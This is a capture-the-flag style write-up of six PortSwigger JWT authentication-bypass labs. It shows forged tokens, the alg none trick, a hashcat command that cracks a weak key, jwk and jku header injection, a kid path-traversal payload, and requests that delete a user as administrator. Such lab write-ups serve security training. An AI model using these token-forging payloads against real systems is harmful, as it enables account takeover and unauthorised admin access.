## 1. **WT authentication bypass via unverified signature**

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives. To solve the lab, modify your session token to gain access to the admin panel at
/admin, then delete the user carlos.

![img](media/9d5b3d84d5ee6ae0401972897fe16897.png)

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and observe the JWT in the session cookie.
3. Modify the `sub` claim in the payload to `administrator`.
4. Send the modified token to access the admin panel at `/admin`.
5. Delete the user `carlos` to complete the lab.
After logging in we are assigned a JWT:

![img](media/0a63fd3607a46527843d33cc1e7fa25c.png)

We can change this JWT in the JSON Web Token extension panel:

![img](media/19ca45c72676b7f048422ef28d31562c.png)

Getting the JWT:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eyJraWQiOiI0MTZkMDg2Yy00MDdhLTRiYzQtODhhMy00MzAyZTUzMTk1ZTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODg2MzR9.qmaz_uqHRR06JTx5vtenCveTPOtzi3mG0X1WMJhnKV3AmzlI3Pjceo3Lldu2oLHcP9SEblyJxJJ5hIO3VVAKzWsWGjNw4aN1vZCBhxzcY-MgxuspBc3XpS1_oMeenFcfEn0I4Jlob_YMrZVqQbdp8i1w_SpYLkMOkDaLlgPZk3TwZa1U005YBhHjQrItMBYWRtQDnP4rYnHkTsgwmWRu8RMCirq9-SS9gczbr2YEENZuPrxWphbYwCSMtivcysFOKXEzCvO7juIKqAfE_WmB6qx41I8Wny-qlkbeU3-9VXyIM8iC6opD6wlUiI9S328bjXN_ZFWsuRdaDVyvE4gRXw
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Then I changed the “Location” header to “/admin”:

![img](media/e78cb99aede60f5d2e6aafc3e46ca576.png)

Getting access to the admin panel:

![img](media/245ff9102112c2c322639e32efd9f4b1.png)

## 2. **WT authentication bypass via flawed signature verification**

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. To solve the lab, modify your session token to gain access to the admin panel at
/admin, then delete the user carlos.

References:

-   https://portswigger.net/web-security/jwt

**Steps:**

1. Log in with the provided credentials: `wiener:peter`.
2. Intercept the `GET /my-account` request and decode the JWT.
3. Change the `alg` value in the header to `none`.
4. Modify the `sub` claim in the payload to `administrator`.
5. Remove the signature part of the token, leaving the trailing dot.
6. Send the modified token to access the admin panel at `/admin`.
7. Delete the user `carlos` to complete the lab.

![img](media/efa213f9e5df48435401fb8af16b4e80.png)

![img](media/bca8ff0b388388703f198a0f8173a626.png)

![img](media/19fb07ac94a84c71162a99cf5ce97fdb.png)

Then delete everything after the second “.” character (that is the signature):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eyJraWQiOiIzNjlmMmFjZC1hZTUwLTQ4YzctYTM2Ny04NTczYzllNTc0ZmQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3ODk4MzB9.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/75bf4f0469b97c01f784f9f573ee101d.png)

Access the admin panel and delete the user:

![img](media/aa1416cc3205f46e18c9686248b67aac.png)

## 3. **JWT authentication bypass via weak signing key**

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely
weak secret key to both sign and verify tokens. This can be easily brute-forced
using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've
obtained this, use it to sign a modified session token that gives you access to
the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp
Suite before attempting this lab.

We also recommend using hashcat to brute-force the secret key. For details on
how to do this, see Brute forcing secret keys using hashcat.

References:

-   https://portswigger.net/web-security/jwt

-   https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list

![img](media/76a7d8db076d5575a13420e6ee00060e.png)

After logging in we get a signed JWT:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/52241098c16a245a09f42f9f7f8e3d94.png)

Then we try to crack it:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/ea694d17aeee5df8b741e1bd593199c6.png)

The cracked value is “secret1”:

![img](media/354cd17b5d1a11b20302f21f622f9c92.png)

I do not understand the JWT extension so I used jwt.io:

![img](media/bf5244ac4ec0a113db8e4e3056093e2c.png)

Getting the following JWT:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It is possible to access as the administrator user with that JWT and delete the
user:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/e55aa099d9f1cc38c419bf850998a325.png)

## 4. **JWT authentication bypass via jwk header injection**

This lab uses a JWT-based mechanism for handling sessions. The server supports
the jwk parameter in the JWT header. This is sometimes used to embed the correct
verification key directly in the token. However, it fails to check whether the
provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel
at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp
Suite before attempting this lab.

References:

-   https://portswigger.net/web-security/jwt

![img](media/4929a88712896a90700c6f16df6b05c7.png)

In “JWT Editor Keys”, generate a RSA key:

![img](media/233fe0ca284c4033f8c2e58b4e0da2f2.png)

In Repeater, in the “JSON Web Token” tab, click “Attack” and “Embedded JWK”:

![img](media/52fb0f4933b6d1964ff1299881fc7889.png)

With this added to the JWT, it is possible to access as administrator:

![img](media/69a9d1a2f1334a53c35061c49e042a5b.png)

And then delete the user:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjM2ZGJkYTM2LTU1MmMtNDM4Yi1hYzRjLTllMzY1ZmI3OGVjNSIsIm4iOiJ6ZENkb2gxMjBYbnY5Q19VeXd4Slg3OGR0cU95TVM0MmNYZm1ualRZRXVTaGdNZDR5QUJRZVV1T2JpYmlrdXl0ZGFvcGRXMFB0WTFRMkFZT2cwSDZBNGlCYlR6UkhOYU44NUlPYjVKN21naUhIcDdvSWpEbFE2d2FqWnNyYWozVVM0aFgzVGRLM2djRUctaDBFV3BTaDlBMzR5ZnEzSENLTGRFVmJWMFhnUm1JM042TmNfVlg1YUljR2tvQUxIWkJkOWcxNzlDZkJ0dnRVdTNjRlBaQThlQzlpdjV4djFBeU80SWRsT1ZkS2pOZXJuUHU5NEx6enlZbEhPYkhIV2otQmFDNVB4NEowakR5bWRQYzlIYUxtNjdubEEwYXFaNktBNEh3elpIR0pFYjJVT18tWWExSENzUmhybnoyZTJRUlBWQU9IZ1FrUFdNS0piNnZPRlU1T1EifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTE3NTd9.LK85IOFXVB2lZE24KXson0NFXgtiNj4ZZNWsOs1tLij8JRa_AdrANyirsX36vSMooau-OlY-esVixuVbUbYYBWui6fO1Ep5mP4Z1rk2GvtRGuXuaCRj6ksFxnpcRj1yWAJ6xlHEzQAFSYBUDtrQTjfydKg9sx-RFhidoabqYkDVvtVG-NYhiVa4Sjfc0_4Nc98wna3PHKU-ompJReLji53YLqqrIMml9OGSzaUYZ5VLhlhoA2OT5zwOcnnYuXx23-cbsab7Jp5Oc5GDB_bQJU_LRTNFsIoII64aEDOz1AbMlXNX4czGGuQtkyR8HKc-owQ54rJoukIMyU-yGMmYz_g
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## 5. **JWT authentication bypass via jku header injection**

This lab uses a JWT-based mechanism for handling sessions. The server supports
the jku parameter in the JWT header. However, it fails to check whether the
provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at
/admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp
Suite before attempting this lab.

References:

-   https://portswigger.net/web-security/jwt

-   https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

![img](media/99d69796ee4365d8d9e2c68fb4990331.png)

It llok like the file “/.well-known/jwks.json” does not exist:

![img](media/cd5df6324792726f189b19a9eae65d95.png)

First I copied the public key part of the RSA key:

![img](media/2f7c13efb83affc825ce798644f3b8ce.png)

And create “/jwks.json” in the exploit server. I added the field "use": "sig":

![img](media/3d8e4bc2b676a0fed7be444d41b63580.png)

![img](media/eb6ccb63f9206462a89a602ec44ca0c1.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
        }
    ]
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Then I created the JWT:

![img](media/c4dcffdb577681223ff1d357bf1c3b27.png)

Header with:

-   The same “kid” as the public key uploaded

-   A “jku” value pointing to the file created in the exploit server

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
  "alg": "RS256",
  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Payload with:

-   The “sub” value changed to the user administrator

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683792794
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The JWT:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTM3MDBkNTAzNDg5NGU3ODA4MTM5ZjcwMWIwMDBhNy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTI3OTR9.mY28w-Jf8fMZzO_9qNug5rWXMG8bQq-zpuQLmsQnPPjLziXt5vHOESQeZcCs5wZaagVwkXU9IuRW0mvXsM5AwvuCDG1K22XIP_mL2-RNBQpN_qOE1HVJPIdy-Iq0F1V1DgEAYcNo9QQgcxX1AmhW9AQ0urD4qnLGk8leZYX-J4okBw-583qj2NsgX5zPan_JJ0bqupysw1cy8G9eR4h57wV1wM5oOiGhS5fX2gasKq5RSv4TUQ0Rk6FwONnmNhFJMNKn7HYRxGeoDv-A1118w49G6QSDqWsSuuFgCPy2oLQ-TGMDJBBDBGUNNy-serxOKJ7JjkY9qp1sC9E5hekzHQ
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/8d0b8a75d0425560b111b74322644514.png)

If done with Burp:

![img](media/548e2f8776cf967171cd30d0d900715b.png)

## 6. **JWT authentication bypass via kid header path traversal**

This lab uses a JWT-based mechanism for handling sessions. In order to verify
the signature, the server uses the kid parameter in JWT header to fetch the
relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at
/admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp
Suite before attempting this lab.

References:

-   https://portswigger.net/web-security/jwt

![img](media/10158eefc62451977a7458ed9db523a1.png)

We can create the JWT in jwt.io using a null string and the following values:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
  "kid": "../../../dev/null",
  "alg": "HS256"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683794863
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/f4bd11cfc5fe802b9071c3382c2a6278.png)

The JWT:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTQ4NjN9.b8LLRBm6W5U8yph9LZVt24QSyamKPZAbrlaoQxAnaGM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /admin HTTP/2
...
Cookie: session=eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTQ4NjN9.b8LLRBm6W5U8yph9LZVt24QSyamKPZAbrlaoQxAnaGM
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/05f2b05ba72f1ab44b00ad13dd110577.png)
